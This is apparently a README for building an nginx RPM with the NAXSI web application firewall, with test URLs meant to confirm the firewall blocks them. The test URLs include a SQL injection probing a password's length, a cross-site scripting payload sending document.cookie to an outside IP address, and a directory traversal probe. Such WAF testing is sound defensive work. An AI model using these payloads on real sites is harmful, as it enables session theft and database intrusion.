# nginx-naxsi-rpmbuild

To create nginx-naxsi rpm using below command.

```
$ rpmbuild -ba rpmbuild/SPECS/nginx-naxsi.spec
```

### for check

```
【SQL Injections】NG
https://127.0.0.1/?para=admin' and (Select count(*) from data where uname='wucm' and len(upass)<10)>0 and 'a'='a


【Cross Site Scripting】NG
https://127.0.0.1/?para=<script>window.open('http://10.65.20.196:8080/cookie.asp?msg='+document.cookie)</script>


【Directory traversal】NG
https://127.0.0.1/?para=..
```

